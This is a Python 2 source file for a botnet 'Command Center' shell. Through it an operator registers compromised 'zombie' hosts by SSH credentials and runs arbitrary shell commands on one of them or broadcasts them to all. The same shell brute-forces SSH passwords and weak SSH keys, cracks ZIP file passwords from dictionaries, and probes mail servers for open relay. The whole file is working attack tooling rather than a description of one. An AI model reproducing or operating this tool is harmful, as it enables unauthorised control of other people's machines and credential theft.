from BotNet import *
from mySSHmodule import sshBrute, bruteKey
from myZIPmodule import bruteZip
from cmd import *
import os
import re
import pickle
import socket, argparse, time , datetime, smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

CURRSTATEFILE = 'state.vars'

class shell_cmd(Cmd):
	def do_shell(self, s):
		os.system(s)		
	def help_shell(self):
		print "execute shell commands"		
		
class exit_cmd(Cmd):		
	def can_exit(self):
		return True
	def onecmd(self, line):
		r = super (exit_cmd, self).onecmd(line)
		if r and (self.can_exit() or
			raw_input('exit anyway ? (yes/no):')=='yes'):
				return True
		return False
	def do_exit(self, s):
		return True
	def help_exit(self):
		print "Exit the interpreter."
		print "You can also use the Ctrl-D shortcut."
	do_EOF = do_exit
	help_EOF= help_exit
	
class MyCmdInterpreter(Cmd, shell_cmd, exit_cmd):
	def __init__(self):
		Cmd.__init__(self)
		shell_cmd.__init__(self)
		exit_cmd.__init__(self)
		os.system('clear')
		self.intro = '\n**************************************\n' + \
		'*                                    *\n' + \
		'*  Command Center                    *\n' + \
		'*      author: 0x4ndr3               *\n' + \
		'*                                    *\n' + \
		'**************************************\n\n'
		self.prompt='hub# '
		self.bot = BotNet()

	def emptyline(self):
		pass
		
	def help_remove(self):
		print 'Description: removes zombie host from botnet'
		print 'usage: remove -h <hostname>\n'
			
	def do_remove(self, s):
		matches = re.findall(r'(--?[\w-]+)(.*?)(?= -|$)', s)
		result = {}
		for match in matches:
			result[match[0]] = True if not match[1] else match[1].strip()
		try:
			host = result['-h']
		except:
			self.help_remove()
			return
		ret = self.bot.delZombie(host)
		if ret == 0:
			print 'Zombie removed\n'
		elif ret == 1:
			print 'Zombie not removed. Make sure the indicated host does exit - list command\n'

	def help_add(self):
		print 'Description: adds zombie host to botnet'
		print 'usage: add -h <hostname> -u <user> -p <password> -P <port>\n'
			
	def do_add(self, s):
		matches = re.findall(r'(--?[\w-]+)(.*?)(?= -|$)', s)
		result = {}
		for match in matches:
			result[match[0]] = True if not match[1] else match[1].strip()
		try:
			host = result['-h']
			user = result['-u']
			pwd = result['-p']
			port = int(result['-P'])
			ret = self.bot.addZombie(host, user, pwd, port)
			if ret == 0:
				print 'Zombie inserted\n'
			elif ret == 1:
				s = raw_input('Zombie host already inserted. Wish to replace (credential update?) (Y/n): ')
				if s == '' or s == 'y' or s == 'Y' or s == 'yes' or s == 'YES' or s == 'Yes': s = 'yes'
				#if s in ('', 'y','Y','yes','YES','Yes'):
				else: s = 'no'
				if s == 'yes':
					self.bot.updateZombie(host, user, pwd, port)
					print 'Zombie updated'
				print
		except:
			self.help_add()
			return
		
	def help_broadcast(self):
		print 'Description: executes commands on all zombies'
		print 'usage: broadcast <shell command>\n'
	
	def do_broadcast(self, s):
		if s.strip() == '':
			self.help_broadcast()
			return
		self.bot.execCommand(s, 'ALL')
		return
		
	def help_execute(self):
		print 'Description: executes commandon spefic zombie'
		print 'usage: execute <hostname> <shell command>\n'

	def do_execute(self, s):
		try:
			host = s.split()[0]
			command = ' '.join(s.split()[1:])
			ret = self.bot.execCommand(command, host)
			if ret == 0:
				print 'Command executed on host ' + host + '\n'
			elif ret == 1:
				print 'Specified host: ' + host + 'not found on zombies list\n'
			else: # ret == 2
				print host + ' - is not a valid host\n\n'
				self.help_execute()
		except:
			self.help_execute()
			return

	def help_list(self):
		print 'Description: lists all zombies inserted'
		print '         -c/--check checks for connectivity'
		print 'usage: list [-c]\n'
		
	def do_list(self, s):
		matches = re.findall(r'(--?[\w-]+)(.*?)(?= -|$)', s)
		result = {}
		for match in matches:
			result[match[0]] = True if not match[1] else match[1].strip()
		check_conn = '-c' in result.keys() or '--check' in result.keys()
		if not check_conn:
			if s.strip(' ') != '':
				self.help_list()
		for zombie in self.bot.getZombies():
			print zombie.list(check_conn)
		print

	def help_save(self):
		print 'Description: saves inserted zombies state into file ' + CURRSTATEFILE
		print 'usage: save\n'
		
	def do_save(self, s):
		file = open(CURRSTATEFILE, 'w')
		pickle.dump(self.bot, file)
		file.close()
		print 'state saved\n'
	
	def help_restore(self):
		print 'Description: restores previously inserted zombies from file ' + CURRSTATEFILE
		print 'usage: restore\n'

	def do_restore(self, s):
		try:
			file = open(CURRSTATEFILE, 'r')
			self.bot = pickle.load(file)
			file.close()
			print 'state restored\n'
		except:
			print 'state file (' + CURRSTATEFILE + ') not found: no state to restore\n'
		
	def	__bruteforce_key(self, host, user, port):
		return
	
	def help_bruteforce(self):
		print 'Description: bruteforces SSH credentials on specific host'
		print 'usage: bruteforce [ --ssh -h <hostname> -u <user> -f <dictionary> [-p <port>] ]'
		print '                | [ --ssh -h <hostname> -u <user> --pub -D <dir with keyfiles> [-p <port>] ]'
		print '                | [ --zip -f <zipfile> -d <dictionary> ]\n'
	
	def do_bruteforce(self, s):
		#
		# This is currently just doing bruteforce based on the resources of the machine it's running on.
		# In the future it should take advantage of all Zombies!
		#
		
		matches = re.findall(r'(--?[\w-]+)(.*?)(?= -|$)', s)
		result = {}
		for match in matches:
			result[match[0]] = True if not match[1] else match[1].strip()
		try:
			ssh = '--ssh' in result.keys()
			zip = '--zip' in result.keys()
			if ssh:
				host = result['-h']
				user = result['-u']
				if '-p' in result.keys(): port = int(result['-p'])
				else: port = 22
				pubkey_bruteforce = '--pub' in result.keys()
				if not pubkey_bruteforce:
					try:
						dic = result['-f']
						dic_file = open(dic,'r')
					except:
						print '[-] Could not access dictionary file - ' + dic + '\n'
						return
					print 'Bruteforcing host: ' + host + '...'
					sshBrute(host, user, dic_file, port)
				else:
					passDir = result['-D']
					print 'SSH Bruteforcing host: ' + host + '...'
					ret = bruteKey(host, user, port, passDir)
					if ret != None:
						print '[+] SSH cracked with key inside file: ' + ret + '\n'
					else:
						print '[-] SSH not vulnerable to SSH weak key vulnerability\n'
			elif zip:
				filename = result['-f']
				dic = result['-d']
				bruteZip(filename, dic)
			else:
				self.help_bruteforce()
		except:
			self.help_bruteforce()

	def help_openrelay(self):
		print 'Description: tests mail server for open relay vulnerability'
		print 'usage: openrelay -f <fromaddr> -t <toaddr> -s <mailserver> -p <port> --malurl <url> [--starttls]'

	def do_openrelay(self, s):
		matches = re.findall(r'(--?[\w-]+)(.*?)(?= -|$)', s)
		result = {}
		for match in matches:
			result[match[0]] = True if not match[1] else match[1].strip()
		try:
			fromaddr = result['-f']
			toaddr = result['-t']
			server = result['-s']
			port = result['-p']
			starttls = '--starttls' in result.keys()
			malurl = result['--malurl']

			msg = MIMEMultipart('alternative')
			msg['Subject'] = "Breaking Stuff"
			msg['From'] = fromaddr
			msg['To'] = toaddr

			emailbody = 'The email server ' + server + ' is configured to openrelay on port ' + port + '.'
			mime = MIMEText(emailbody)
			msg.attach(mime)
			print "[!] email built"

			try:
				server = smtplib.SMTP(server + ':' + port)
				if starttls:
					server.starttls()
				server.sendmail(fromaddr, toaddr, msg.as_string())
				server.quit()
			except socket.error:
				print "[-] Problem connecting to mail server " + server + " at port " + port
			except smtplib.SMTPRecipientsRefused:
				print "[-]The mail server did not accept the recipient email address."
			except:
				print "[-] Unexpected error - possibly invalid emails inserted as from and to fields."
				print "[!] Please report an issue to the github repository."
			else:
				print "[+] Successfully submitted email!"
			finally:
				print
		except:
			self.help_openrelay()
